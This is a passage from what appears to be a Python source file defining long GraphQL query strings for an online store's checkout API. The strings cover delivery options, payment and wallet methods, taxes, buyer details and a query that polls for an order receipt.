__typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""
 
 QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on 